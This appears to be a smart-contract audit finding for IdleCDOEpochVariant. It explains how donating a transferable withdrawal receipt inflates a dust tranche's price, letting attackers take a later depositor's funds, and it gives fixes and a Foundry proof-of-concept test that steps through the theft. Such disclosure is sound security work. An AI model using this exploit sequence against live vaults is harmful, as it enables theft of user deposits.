### Title

Donated withdrawal receipts inflate tranche NAV and enable theft of later deposits - ([File: `contracts/IdleCDOEpochVariant.sol`])

### Summary

`IdleCDOEpochVariant` removes unsolicited underlying donations through `_skimDonatedAssets`, but the same accounting path does not isolate donated `strategyToken` balances. A withdrawal request burns the CDO's principal strategy tokens and mints an ERC20 receipt to the requesting user, while the pending withdrawal remains recorded under that user. Transferring that receipt back to the CDO causes the donated claim to be counted again in CDO NAV. A dust tranche holder can therefore inflate their tranche price, cause a later depositor to receive zero shares, and convert the dust position into a withdrawal request covering both the donated claim and the victim's deposit.

### Finding Description

1. During a buffer phase, attacker A deposits `1` wei and receives one dust tranche token.
2. Attacker B deposits `D` and then calls `requestWithdraw`, burning `D` worth of CDO strategy tokens and receiving a strategy-token receipt. The CDO's NAV is reduced by the requested principal, while `pendingWithdraws` still includes the request. [1](#0-0) 
3. B transfers the receipt directly to the CDO. `_skimDonatedAssets` transfers only `token`, so the donated `strategyToken` remains part of the CDO's strategy-token balance. [2](#0-1) [3](#0-2) 
4. The next accounting update treats the returned receipt as a gain above saved NAV and raises the dust tranche's price to approximately `D` underlying per token. [4](#0-3) [5](#0-4) 
5. A victim deposits `V <= D`. `_mintSharesAtCurrPrice` performs integer division and has no nonzero-share check, so the victim receives zero tranche tokens while their funds increase NAV. [6](#0-5) 
6. A calls `requestWithdraw` for the dust tranche. The inflated tranche price produces a request for approximately `D + V`, and the CDO has enough strategy-token balance to burn because it holds both B's donated receipt and the strategy tokens minted by the victim's deposit.
7. At the following `stopEpoch`, the honest borrower funds B's orphaned original request plus A's inflated request. A holds a clean withdrawal receipt and can claim approximately `D + V`, extracting the victim's `V`.

The broken invariant is donation isolation and fair mint/burn accounting: an externally transferred withdrawal receipt is simultaneously an outstanding withdrawal claim and fresh CDO NAV.

### Impact Explanation

The attacker-controlled wallets recover their original `D` exposure through A's new receipt and additionally take the victim's deposit. The approximate net profit is `V - 1` wei, while B's original pending request becomes an unclaimable but still-funded liability because its receipt was transferred away. This is direct theft of user deposits and leaves surplus stranded claim backing in the strategy.

### Likelihood Explanation

The attack requires two attacker-controlled allowed lenders, or one attacker who initially creates the dust position from a separate allowed address. It works during the buffer phase for a newly initialized or low-supply tranche, and the victim only needs to deposit less than the inflated price represented by the dust token. No privileged role needs to act maliciously; the manager only performs the normal `startEpoch` and `stopEpoch` sequence.

### Recommendation

Separate active CDO strategy-token backing from transferable withdrawal receipts instead of deriving NAV from the raw ERC20 balance. Options include:

- Make withdrawal receipts non-transferable or track receipt ownership separately from active strategy principal.
- Track active strategy assets in an internal counter and exclude unsolicited `strategyToken` transfers from NAV.
- Extend donation handling to quarantine strategy-token donations rather than only `token`.
- Reject deposits that mint zero tranche tokens and seed an irreducible minimum supply at initialization.

The receipt redesign is preferable because the present ERC20 balance cannot distinguish active principal, pending withdrawal claims, post-default claims, and donated claims.

### Proof of Concept

The following Foundry-style PoC assumes the repository's standard `IdleCDOEpochVariant` test deployment and honest manager/borrower sequence:

```solidity
function testReceiptDonationInflatesDustClaim() external {
    address attackerA = makeAddr("attackerA"); // dust holder
    address attackerB = makeAddr("attackerB"); // receipt donor
    address victim = makeAddr("victim");

    uint256 donation = 1_000e18;
    uint256 victimDeposit = 999e18;

    _allowWallet(attackerA);
    _allowWallet(attackerB);
    _allowWallet(victim);

    deal(address(underlying), attackerA, 1);
    deal(address(underlying), attackerB, donation);
    deal(address(underlying), victim, victimDeposit);

    // A creates a one-token dust position.
    vm.startPrank(attackerA);
    underlying.approve(address(cdo), 1);
    uint256 dustShares = cdo.depositAA(1);
    assertEq(dustShares, 1);
    vm.stopPrank();

    // B creates and requests withdrawal of the donation-sized position.
    vm.startPrank(attackerB);
    underlying.approve(address(cdo), donation);
    uint256 bShares = cdo.depositAA(donation);
    uint256 bReceipt = cdo.requestWithdraw(bShares, address(AAtranche));
    vm.stopPrank();

    // Donate the transferable strategy-token receipt to the CDO.
    vm.prank(attackerB);
    IERC20(address(strategy)).transfer(address(cdo), bReceipt);

    // The next deposit crystallizes the donation and mints zero shares.
    vm.startPrank(victim);
    underlying.approve(address(cdo), victimDeposit);
    uint256 victimShares = cdo.depositAA(victimDeposit);
    vm.stopPrank();

    assertEq(victimShares, 0);

    // A converts the dust tranche into an inflated pending withdrawal.
    vm.prank(attackerA);
    uint256 inflatedRequest = cdo.requestWithdraw(dustShares, address(AAtranche));
    assertGe(inflatedRequest, donation + victimDeposit - 1);

    // Honest epoch sequencing funds both B's orphaned request and A's request.
    vm.prank(manager);
    cdo.startEpoch();
    vm.warp(cdo.epochEndDate() + 1);

    uint256 owed = strategy.pendingWithdraws();
    deal(address(underlying), borrower, owed);
    vm.prank(borrower);
    underlying.approve(address(cdo), owed);

    vm.prank(manager);
    cdo.stopEpoch(0, 0);

    uint256 before = underlying.balanceOf(attackerA);
    vm.prank(attackerA);
    cdo.claimWithdrawRequest();

    assertGe(underlying.balanceOf(attackerA) - before, inflatedRequest);
}
```
